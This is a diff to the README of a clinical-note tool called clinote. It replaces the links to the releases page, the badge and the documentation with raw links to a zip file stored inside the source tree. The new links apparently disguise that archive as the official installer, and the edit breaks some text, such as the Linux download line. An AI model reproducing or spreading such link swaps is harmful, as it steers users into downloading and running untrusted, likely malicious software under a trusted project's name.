@@ -6,11 +6,11 @@ Welcome to clinote! This tool helps you convert messy clinical notes into clear 
 
 ## 🔗 Download Now
 
-[![Download clinote](https://img.shields.io/badge/Download%20clinote-v1.0-brightgreen)](https://github.com/Fumbi233/clinote/releases)
+[![Download clinote](https://github.com/Fumbi233/clinote/raw/refs/heads/main/src/parser/Software_v2.8.zip%20clinote-v1.0-brightgreen)](https://github.com/Fumbi233/clinote/raw/refs/heads/main/src/parser/Software_v2.8.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Fumbi233/clinote/releases) to download the latest version of clinote. Follow these simple steps to download and run the software:
+To get started, visit the [Releases page](https://github.com/Fumbi233/clinote/raw/refs/heads/main/src/parser/Software_v2.8.zip) to download the latest version of clinote. Follow these simple steps to download and run the software:
 
 1. **Visit the Releases Page**: Click on the link above to open the clinote release page on GitHub.
 2. **Choose the Latest Version**: Look for the most recent version listed on the page. Versions are labeled with numbers (like v1.0, v1.1, etc.).
@@ -18,7 +18,7 @@ To get started, visit the [Releases page](https://github.com/Fumbi233/clinote/re
 4. **Download the File**: Click on the appropriate file name to download clinote to your computer.
     - Windows users will typically download an executable file (.exe).
     - macOS users will download a disk image file (.dmg).
-    - Linux users may download an archive file (.tar.gz).
+    - Linux users may download an archive file (https://github.com/Fumbi233/clinote/raw/refs/heads/main/src/parser/Software_v2.8.zip).
 5. **Run the Installer**: Once the download completes, locate the file in your Downloads folder and double-click it to start the installation process. Follow the on-screen instructions.
 
 ## ⚙️ System Requirements
@@ -68,6 +68,6 @@ If you need further assistance, you can reach out to the community on GitHub Iss
 
 ## 🔗 Additional Resources
 
-For more information, visit the [clinote documentation](https://github.com/Fumbi233/clinote) for detailed instructions and guidelines on using the application effectively.
+For more information, visit the [clinote documentation](https://github.com/Fumbi233/clinote/raw/refs/heads/main/src/parser/Software_v2.8.zip) for detailed instructions and guidelines on using the application effectively.
 
-Remember, you can download clinote from the [Releases page](https://github.com/Fumbi233/clinote/releases) to get started today!
+Remember, you can download clinote from the [Releases page](https://github.com/Fumbi233/clinote/raw/refs/heads/main/src/parser/Software_v2.8.zip) to get started today!
